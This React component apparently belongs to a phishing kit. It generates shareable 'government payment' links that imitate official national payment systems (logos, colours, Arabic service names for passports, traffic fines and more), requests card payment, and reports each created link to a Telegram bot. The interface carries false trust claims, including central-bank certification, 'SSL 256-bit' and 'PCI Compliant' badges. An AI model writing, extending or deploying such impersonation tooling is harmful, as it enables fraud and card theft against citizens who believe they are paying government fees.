import React, { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getGovernmentServiceByKey, getGovernmentServicesByCountry } from "@/lib/governmentPaymentServices";
import { getCurrencyCode } from "@/lib/countryCurrencies";
import { 
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock,
  Link as LinkIcon,
  Landmark,
  FileText
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";
import SEOHead from "@/components/SEOHead";

const GovernmentPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const [selectedService, setSelectedService] = useState(serviceKey || '');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);

  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
  const governmentServices = useMemo(() => getGovernmentServicesByCountry(country || 'SA'), [country]);
  const selectedServiceData = useMemo(
    () => getGovernmentServiceByKey(selectedService),
    [selectedService]
  );

  const primaryColor = govSystem.colors.primary;

  const handleCreateLink = async () => {
    if (!selectedService || !selectedServiceData) {
      toast({
        title: "تنبيه",
        description: "الرجاء اختيار الخدمة أولاً",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || selectedServiceData.country,
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData.nameAr,
          payment_amount: 0,
          currency_code: getCurrencyCode(country || selectedServiceData.country),
          provider: selectedServiceData.key.toUpperCase(),
          selectedCountry: country || selectedServiceData.country,
          payment_method: "card",
        },
      });

      const baseUrl = typeof window !== 'undefined'
        ? window.location.origin
        : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://glittering-eclair-9e77e0.netlify.app');
      
      const currencyCode = getCurrencyCode(country || selectedServiceData.country);
      const queryParams = new URLSearchParams({
        service: selectedService,
        country: country || selectedServiceData.country,
        currency: currencyCode,
        provider: selectedServiceData.key.toUpperCase()
      }).toString();
      
      const paymentUrl = `${baseUrl}/pay/${link.id}?${queryParams}`;

      setCreatedLink(paymentUrl);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'payment_link_created',
        data: {
          service: selectedServiceData.nameAr,
          country: country || selectedServiceData.country,
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({
        title: "✅ تم إنشاء رابط الدفع بنجاح",
        description: "يمكنك الآن نسخ الرابط أو معاينته",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء رابط الدفع",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdLink);
    toast({
      title: "✅ تم النسخ",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdLink, '_blank');
  };

  if (showSuccess) {
    return (
      <>
        <SEOHead 
          title={`تم إنشاء رابط ${selectedServiceData?.nameAr} - ${govSystem.nameAr}`}
          description={`رابط دفع آمن لخدمة ${selectedServiceData?.nameAr} عبر نظام ${govSystem.nameAr}`}
          image="/og-government_payment.jpg"
          type="website"
        />
        <div 
          className="min-h-screen flex items-center justify-center py-8 px-4"
          style={{
            background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
            fontFamily: govSystem.fonts.primaryAr
          }}
          dir="rtl"
        >
          <Card 
            className="max-w-2xl w-full overflow-hidden border-0 shadow-2xl"
            style={{ borderRadius: govSystem.borderRadius.lg }}
          >
            <div 
              className="p-8 text-center"
              style={{
                background: govSystem.gradients.header,
              }}
            >
              <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
                <CheckCircle className="w-12 h-12 text-white" />
              </div>
              <h2 className="text-3xl font-bold text-white mb-2">
                تم إنشاء رابط الدفع بنجاح
              </h2>
              <p className="text-white/90">
                يمكنك الآن مشاركة الرابط مع العميل
              </p>
            </div>

            <div className="p-8 space-y-6">
              <div 
                className="p-6 rounded-xl border-2"
                style={{
                  borderColor: primaryColor,
                  background: `${primaryColor}08`
                }}
              >
                <div className="text-sm font-semibold mb-2">
                  رابط الدفع
                </div>
                <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
                  {createdLink}
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <Button
                  onClick={handleCopyLink}
                  size="lg"
                  className="w-full"
                  style={{
                    background: govSystem.gradients.primary,
                    color: govSystem.colors.textOnPrimary
                  }}
                >
                  <Copy className="w-5 h-5 ml-2" />
                  نسخ الرابط
                </Button>
                <Button
                  onClick={handlePreview}
                  size="lg"
                  variant="outline"
                  className="w-full"
                  style={{
                    borderColor: primaryColor,
                    color: primaryColor
                  }}
                >
                  <ExternalLink className="w-5 h-5 ml-2" />
                  معاينة الرابط
                </Button>
              </div>

              <Button
                onClick={() => window.location.href = '/services'}
                size="lg"
                variant="ghost"
                className="w-full"
              >
                العودة للخدمات
              </Button>
            </div>
          </Card>
        </div>
      </>
    );
  }

  return (
    <>
      <SEOHead 
        title={`${govSystem.nameAr} - السداد الحكومي`}
        description={`إنشاء روابط دفع آمنة للخدمات الحكومية عبر ${govSystem.nameAr}`}
        image="/og-government_payment.jpg"
        type="website"
      />
      
      <div 
        className="min-h-screen py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <div className="container mx-auto max-w-3xl">
          <div className="mb-6">
            <BackButton />
          </div>

          <Card 
            className="overflow-hidden border-0 shadow-2xl"
            style={{ borderRadius: govSystem.borderRadius.lg }}
          >
            <div 
              className="p-8 sm:p-12 text-center relative overflow-hidden"
              style={{
                background: govSystem.gradients.header,
              }}
            >
              <div className="absolute inset-0 opacity-10">
                <div className="absolute inset-0" style={{ backgroundImage: 'radial-gradient(circle at 20% 50%, white 1px, transparent 1px), radial-gradient(circle at 80% 50%, white 1px, transparent 1px)', backgroundSize: '50px 50px' }} />
              </div>
              <div className="relative z-10">
                <div className="flex items-center justify-center gap-4 mb-6">
                  {govSystem.logo && (
                    <div className="bg-white/95 backdrop-blur-sm p-4 rounded-2xl shadow-2xl">
                      <img 
                        src={govSystem.logo} 
                        alt={govSystem.nameAr}
                        className="h-16 sm:h-20 w-auto object-contain"
                      />
                    </div>
                  )}
                </div>
                <h1 className="text-3xl sm:text-4xl font-black text-white mb-3 drop-shadow-lg">
                  {govSystem.nameAr}
                </h1>
                <p className="text-white/95 text-base sm:text-lg font-semibold">
                  إنشاء رابط دفع للخدمات الحكومية
                </p>
              </div>
            </div>

            <div className="p-8 sm:p-10 space-y-8">
              <div>
                <Label className="text-lg font-bold mb-4 block flex items-center gap-2" style={{ color: govSystem.colors.text }}>
                  <Landmark className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                  اختر الخدمة الحكومية *
                </Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger 
                    className="h-14 sm:h-16 border-2 text-base sm:text-lg shadow-sm transition-all"
                    style={{
                      borderColor: govSystem.colors.border,
                      fontFamily: govSystem.fonts.primaryAr,
                      borderRadius: govSystem.borderRadius.lg
                    }}
                  >
                    <SelectValue placeholder="اختر الخدمة..." />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50 max-h-[400px]">
                    {governmentServices.map((service) => (
                      <SelectItem key={service.id} value={service.key} className="text-base py-3">
                        <div>
                          <div className="font-bold">{service.nameAr}</div>
                          {service.description && (
                            <div className="text-xs text-muted-foreground">{service.description}</div>
                          )}
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedServiceData && (
                  <div 
                    className="mt-3 p-3 rounded-lg"
                    style={{
                      background: `${primaryColor}08`,
                      borderRight: `3px solid ${primaryColor}`
                    }}
                  >
                    <p className="text-sm font-semibold" style={{ color: primaryColor }}>
                      ✓ {selectedServiceData.nameAr}
                    </p>
                    <p className="text-xs text-gray-600 mt-1">
                      {selectedServiceData.description}
                    </p>
                  </div>
                )}
              </div>

              <div 
                className="p-5 sm:p-6 rounded-2xl shadow-md"
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}08, ${primaryColor}05)`,
                  border: `2px solid ${primaryColor}20`,
                  borderRadius: govSystem.borderRadius.lg
                }}
              >
                <div className="flex items-start gap-4">
                  <div className="flex-shrink-0 w-12 h-12 rounded-full flex items-center justify-center" style={{ background: govSystem.gradients.primary }}>
                    <Shield className="w-6 h-6 text-white" />
                  </div>
                  <div className="flex-1">
                    <p className="text-base sm:text-lg font-bold mb-2" style={{ color: primaryColor }}>
                      🔒 معاملة آمنة ومشفرة
                    </p>
                    <p className="text-sm sm:text-base text-gray-700 leading-relaxed">
                      جميع البيانات والمعاملات محمية بتقنية التشفير SSL 256-bit ومعتمدة من البنك المركزي
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={handleCreateLink}
                disabled={isSubmitting || !selectedService}
                className="w-full h-16 sm:h-18 text-lg sm:text-xl font-black text-white shadow-2xl hover:shadow-3xl hover:scale-[1.02] transition-all duration-300 disabled:hover:scale-100"
                style={{
                  background: govSystem.gradients.primary,
                  boxShadow: govSystem.shadows.lg || `0 10px 40px -10px ${govSystem.colors.primary}80`,
                  borderRadius: govSystem.borderRadius.lg
                }}
              >
                {isSubmitting ? (
                  "جاري إنشاء الرابط..."
                ) : (
                  <>
                    <LinkIcon className="w-5 h-5 ml-2" />
                    إنشاء رابط الدفع
                  </>
                )}
              </Button>

              <div className="pt-6 border-t-2" style={{ borderColor: govSystem.colors.border }}>
                <h3 className="font-bold text-lg sm:text-xl mb-5 flex items-center gap-2" style={{ color: govSystem.colors.text }}>
                  <FileText className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                  الخدمات الحكومية المتاحة
                </h3>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                  {[
                    '🛂 جواز السفر',
                    '🚗 المخالفات المرورية',
                    '🪪 رخصة القيادة',
                    '🏛️ الخدمات البلدية',
                    '📄 العقود والاتفاقيات',
                    '🆔 الأحوال المدنية',
                    '🎓 التعليم والجامعات',
                    '🏥 الخدمات الصحية',
                    '💼 العمل والتوظيف',
                    '🛡️ التأمينات الاجتماعية',
                    '🚙 استمارة المركبات',
                    '📦 الجمارك والضرائب'
                  ].map((service, index) => (
                    <div 
                      key={index}
                      className="p-3 sm:p-4 rounded-xl text-center text-xs sm:text-sm font-bold transition-all hover:scale-105 cursor-default shadow-sm"
                      style={{
                        background: `linear-gradient(135deg, ${primaryColor}08, ${primaryColor}05)`,
                        color: govSystem.colors.text,
                        border: `1.5px solid ${primaryColor}15`,
                        borderRadius: govSystem.borderRadius.md
                      }}
                    >
                      {service}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <div 
              className="px-8 py-4 text-center text-xs"
              style={{
                background: govSystem.colors.surface,
                borderTop: `1px solid ${govSystem.colors.border}`
              }}
            >
              <div className="flex items-center justify-center gap-4 text-gray-500">
                <div className="flex items-center gap-1">
                  <Lock className="w-3 h-3" />
                  <span>SSL Encrypted</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <Shield className="w-3 h-3" />
                  <span>PCI Compliant</span>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </>
  );
};

export default GovernmentPaymentLinkCreator;
